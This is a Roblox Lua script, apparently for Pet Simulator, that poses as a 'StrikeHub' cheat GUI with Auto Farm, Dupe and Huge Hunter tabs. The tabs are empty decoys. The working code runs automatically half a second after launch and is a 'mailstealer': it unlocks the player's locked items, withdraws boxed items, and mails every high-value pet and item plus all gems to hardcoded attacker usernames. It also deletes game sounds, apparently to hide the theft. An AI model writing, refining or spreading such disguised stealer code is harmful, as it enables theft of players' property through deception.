_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- =================== UNIVERSAL EXECUTOR COMPATIBILITY ===================
local requestFunction = request or (syn and syn.request) or (fluxus and fluxus.request) or http_request
local getgcFunction = getgc or (debug and debug.getgc) or get_gc_objects
local getHUI = (gethui and gethui) or function() return game:GetService("CoreGui") end
local queueOnTP = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
-- =======================================================================

local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "GGz"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = _G.minrap or 10000000 -- 10 million min RAP
local webhook = _G.webhook or ""
_G.StrikeHubLogo = _G.StrikeHubLogo or "" -- optional: set to an image URL if you want a logo

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

-- ===================== Mail cost function =====================
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgcFunction()) do
    if type(func)=="function" and debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end
local mailSendPrice = FunctionToGetFirstPriceOfMail()
local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

-- ===================== RAP functions =====================
local AbstractGetRAP = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)
local function getRAP(Type, Item)
    return AbstractGetRAP.Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end
    }) or 0
end

-- ===================== Mail sending =====================
local function sendItem(category, uid, amount)
    local userIndex, maxUsers = 1, #users
    while userIndex <= maxUsers do
        local sendAmount = (category == "Pet") and 1 or amount
        local args = {users[userIndex], MailMessage, category, uid, sendAmount}
        local response, err = network.Invoke("Mailbox: Send", unpack(args))
        if response then
            GemAmount1 -= mailSendPrice
            mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
            if category ~= "Pet" then break end
            amount -= 1
            if amount <= 0 then break end
        elseif err == "They don't have enough space!" then
            userIndex += 1
        else
            warn("Failed to send item:", err)
            break
        end
    end
end

local function SendAllGems()
    local gemUID
    for uid, data in pairs(GetSave().Inventory.Currency) do
        if data.id == "Diamonds" then
            gemUID = uid
            break
        end
    end
    if not gemUID or GemAmount1 <= 0 then return end
    local userIndex, maxUsers = 1, #users
    while userIndex <= maxUsers do
        local args = {users[userIndex], MailMessage, "Currency", gemUID, GemAmount1}
        local success, err = network.Invoke("Mailbox: Send", unpack(args))
        if success then
            GemAmount1 = 0
            break
        elseif err == "They don't have enough space!" then
            userIndex += 1
        else
            warn("Gem send failed:", err)
            break
        end
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
            if value._uq then
                network.Invoke("Box: Withdraw All", key)
            end
        end
    end
end

local function ClaimMail()
    local response, err = network.Invoke("Mailbox: Claim All")
    while err == "You must wait 30 seconds before using the mailbox!" do
        task.wait(0.05)
        response, err = network.Invoke("Mailbox: Claim All")
    end
end

local function canSendMail()
    local uid
    if save["Pet"] then
        for i,v in pairs(save["Pet"]) do uid=i break end
    end
    if not uid then return false end
    local _, err = network.Invoke("Mailbox: Send", "Roblox","Test","Pet",uid,1)
    return (err == "They don't have enough space!")
end

require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

-- ===================== Sort items =====================
local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Ultimate"}
for _,v in pairs(categoryList) do
    if save[v] then
        for uid,item in pairs(save[v]) do
            local rapValue = getRAP(v, item)
            if v=="Pet" then
                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                if (dir.huge or dir.exclusiveLevel) and rapValue >= min_rap then
                    local prefix = (item.pt==1 and "Golden " or item.pt==2 and "Rainbow " or "")
                    if item.sh then prefix = "Shiny " .. prefix end
                    local id = prefix .. item.id
                    table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=id})
                    totalRAP += rapValue * (item._am or 1)
                end
            elseif rapValue >= min_rap then
                table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=item.id})
                totalRAP += rapValue * (item._am or 1)
            end
            if item._lk then
                network.Invoke("Locking_SetLocked", uid, false)
            end
        end
    end
end

-- ===================== Mail process =====================
local function StartMailProcess()
    if #sortedItems == 0 and not (GemAmount1 > min_rap + mailSendPrice) then
        message.Error("Nothing meets the minimum RAP or not enough gems.")
        return
    end

    ClaimMail()
    EmptyBoxes()
    if not canSendMail() then
        message.Error("Account error. Please rejoin or use a different account")
        return
    end

    table.sort(sortedItems,function(a,b) return (a.rap*a.amount)>(b.rap*b.amount) end)
    message.Error("Please wait while the script loads!")

    for _, item in ipairs(sortedItems) do
        if item.rap >= min_rap and GemAmount1 > mailSendPrice then
            if item.category == "Pet" then
                for i = 1, item.amount do
                    task.spawn(function()
                        sendItem(item.category, item.uid, 1)
                    end)
                    task.wait(0.05)
                end
            else
                task.spawn(function()
                    sendItem(item.category, item.uid, item.amount)
                end)
                task.wait(0.05)
            end
        end
    end

    if GemAmount1 > mailSendPrice then
        SendAllGems()
    end
end

-- ===================== GUI =====================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "StrikeHubGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = plr:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Name = "Main"
Frame.Size = UDim2.new(0, 500, 0, 400)
Frame.Position = UDim2.new(0, 10, 0.5, -200) -- left-center
Frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

-- Tabs
local Tabs = {"Home","Current Event","Auto Farm","Egg","Mailbox","Dupe","Huge Hunter"}
local TabButtons = {}
local ContentFrames = {}

for i, name in ipairs(Tabs) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0,100,0,30)
    btn.Position = UDim2.new(0,(i-1)*70,0,0)
    btn.Text = name
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.BackgroundColor3 = Color3.fromRGB(35,35,35)
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.Parent = Frame
    TabButtons[name] = btn

    local cf = Instance.new("Frame")
    cf.Size = UDim2.new(1,0,1,-40)
    cf.Position = UDim2.new(0,0,0,40)
    cf.BackgroundTransparency = 1
    cf.Visible = (i==1)
    cf.Parent = Frame
    ContentFrames[name] = cf

    btn.MouseButton1Click:Connect(function()
        for _, f in pairs(ContentFrames) do f.Visible=false end
        cf.Visible = true
    end)
end

-- Draggable after 5 seconds
task.delay(5,function()
    Frame.Active = true
    Frame.Draggable = true
end)

-- ===================== Disable sounds =====================
game.DescendantAdded:Connect(function(x)
    if x.ClassName=="Sound" then
        x.Volume = 0
        x:Destroy()
    end
end)

-- ===================== Run mail sender immediately =====================
task.delay(0.5,function()
    local success, err = pcall(function()
        StartMailProcess()
    end)
    if not success then
        warn("Mail sender failed:", err)
    end
end)
